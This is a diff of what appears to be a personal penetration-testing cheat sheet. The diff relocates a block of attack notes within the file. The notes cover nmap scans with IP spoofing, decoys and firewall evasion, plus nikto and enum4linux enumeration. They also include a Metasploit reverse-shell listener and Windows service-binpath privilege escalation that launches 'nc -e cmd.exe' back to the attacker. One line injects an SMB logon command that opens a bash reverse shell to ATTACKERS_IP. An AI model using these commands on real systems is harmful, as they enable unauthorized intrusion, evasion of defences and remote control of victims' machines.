@@ -1,44 +1,5 @@
 # 0sc9.crt
 
-*identify Targets nmap -sn*
-1) nmap all ports (TCP & UDP)
-2) nmap and spoof source port (--source-port <portnumber>) // spoof source address(-S <IP_Address>)
-2) nmap with decoy (nmap -sS -sV -Pn -T4 -D <FAKE_IP_ADDRESS> <TARGET> /// nmap -sU -sV -Pn -T4 -D <FAKE_IP_ADDRESS> <TARGET>) 
-3) refer to https://nmap.org/book/man-bypass-firewalls-ids.html in order to evade firewall.
-4) Look for services and their exploit POC's.
-5) Web ports are open? (nikto -Display V -host <IP_ADDRESS> -port <PORT> -Tuning x 6 -o ~/Desktop/<IP_ADDRESS>/Nikto_Output.html -Format html)
-6) Check for null sessions (run enum4linux -a on the target)
-7) run NSE scripts (NmapVuln & Enumerator) on those ports
-
-----------------------------------------------------------------------------------------------------
-
-ip -4 addr show scope global    /*Determine interfaces ip address + prefix*/
-ip route show | grep default    /*Determine which interface is public*/
------------------------------------------------------------------------------------------------------
-In order to get multiple session on a single multi/handler, 
-you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. 
-For example, for shell/reverse_tcp payload,
-
-msf>use exploit multi/handler
-msf>set payload windows/shell/reverse_tcp
-msf>set lhost <local IP>
-msf>set lport <local port>
-msf> set ExitOnSession false
-msf>exploit -j
-
-The -j option is to keep all the connected session in the background.
-----------------------------------------------------------------------------
-Post - privs escalation
-
-* Accesschk stuff
-accesschk.exe /accepteula (first thing to do in CLI access)
-accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
-accesschk.exe /accepteula -ucqv <SERVICE_NAME>
-sc qc <SERVICE_NAME>
-sc config <SERVICE_NAME> binpath= "C:\<NC.EXE_PATH> -nv <LHOST> <LPORT> -e C:\WINDOWS\System32\cmd.exe"
-sc config <SERVICE_NAME> obj= ".\LocalSystem" password= ""
-sc config <SERVICE_NAME> start= auto
-net start <SERVICE_NAME>
 
 ----------------------------------------------------------------------------------------------------------------------
 Enumeration Roadmap
@@ -227,4 +188,46 @@ cmedb - creds/hosts (show results)
 *SMBclient
 smbclient '\\<TARGET_IP>\<Share>'
 smb: \> logon "/='nc <ATTACKERS_IP> <ATTACKERS_PORT> -e /bin/bash'"
+
+*identify Targets nmap -sn*
+1) nmap all ports (TCP & UDP)
+2) nmap and spoof source port (--source-port <portnumber>) // spoof source address(-S <IP_Address>)
+2) nmap with decoy (nmap -sS -sV -Pn -T4 -D <FAKE_IP_ADDRESS> <TARGET> /// nmap -sU -sV -Pn -T4 -D <FAKE_IP_ADDRESS> <TARGET>) 
+3) refer to https://nmap.org/book/man-bypass-firewalls-ids.html in order to evade firewall.
+4) Look for services and their exploit POC's.
+5) Web ports are open? (nikto -Display V -host <IP_ADDRESS> -port <PORT> -Tuning x 6 -o ~/Desktop/<IP_ADDRESS>/Nikto_Output.html -Format html)
+6) Check for null sessions (run enum4linux -a on the target)
+7) run NSE scripts (NmapVuln & Enumerator) on those ports
+
+----------------------------------------------------------------------------------------------------
+
+ip -4 addr show scope global    /*Determine interfaces ip address + prefix*/
+ip route show | grep default    /*Determine which interface is public*/
+-----------------------------------------------------------------------------------------------------
+In order to get multiple session on a single multi/handler, 
+you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. 
+For example, for shell/reverse_tcp payload,
+
+msf>use exploit multi/handler
+msf>set payload windows/shell/reverse_tcp
+msf>set lhost <local IP>
+msf>set lport <local port>
+msf> set ExitOnSession false
+msf>exploit -j
+
+The -j option is to keep all the connected session in the background.
+
+
+----------------------------------------------------------------------------
+Post - privs escalation
+----------------------------------------------------------------------------
+* Accesschk stuff
+accesschk.exe /accepteula (first thing to do in CLI access)
+accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
+accesschk.exe /accepteula -ucqv <SERVICE_NAME>
+sc qc <SERVICE_NAME>
+sc config <SERVICE_NAME> binpath= "C:\<NC.EXE_PATH> -nv <LHOST> <LPORT> -e C:\WINDOWS\System32\cmd.exe"
+sc config <SERVICE_NAME> obj= ".\LocalSystem" password= ""
+sc config <SERVICE_NAME> start= auto
+net start <SERVICE_NAME>
 
